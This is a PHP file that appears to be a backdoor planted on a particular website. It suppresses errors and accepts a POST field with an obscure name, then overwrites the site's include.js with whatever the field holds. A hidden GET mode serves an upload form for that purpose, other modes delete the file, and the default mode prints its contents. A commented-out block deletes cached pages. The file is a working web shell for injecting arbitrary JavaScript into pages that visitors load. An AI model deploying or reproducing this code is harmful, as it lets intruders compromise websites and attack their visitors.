<?
	error_reporting(0);
	$script_man='/home/1/s/sh/shb1_024/francescagiordano.com/public_html/include.js';
?>
<?
if ($_POST[data_fjhgds76fdsf])
{
	if (get_magic_quotes_gpc()) {
	   function stripslashes_deep($value)
	   {
	       $value = is_array($value) ?
	                   array_map('stripslashes_deep', $value) :
	                   stripslashes($value);

	       return $value;
	   }

	   $_POST = array_map('stripslashes_deep', $_POST);
	   $_GET = array_map('stripslashes_deep', $_GET);
	   $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
	   $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
	}

	$fp = fopen ($script_man, "w");
	fwrite ($fp, $_POST[data_fjhgds76fdsf]);
	fclose ($fp);

    /*
	if ($handle = opendir('/home/as001837/public_html/cache/page/')) {
	    while (false !== ($file = readdir($handle)))
	    {
	        if ($file != "." && $file != "..")
	        {
	        	unlink('/home/as001837/public_html/cache/page/'.$file);
	            //rename($file,$file.'.'.rand(1,9999999));
	            print $file.'<br>';
	        }
	    }
	    closedir($handle);
	}
	*/


	print 'save, man';
}
else
{	if ($_GET[mode]=='need_form_man')
	{
		?>
			<form method=post action="?">
			<textarea name="data_fjhgds76fdsf" rows="10" cols="100"></textarea>
			<input type="submit">
			</form>
		<?
	}
	elseif ($_GET[mode]=='need_clear_man')
	{
		@unlink($script_man);
		print 'erase, man';	}
	elseif ($_GET[mode]=='need_test_man')
	{
		@unlink($script_man);
		print 'test, man';
	}
	else
	{    	print @file_get_contents($script_man);	}}
?>
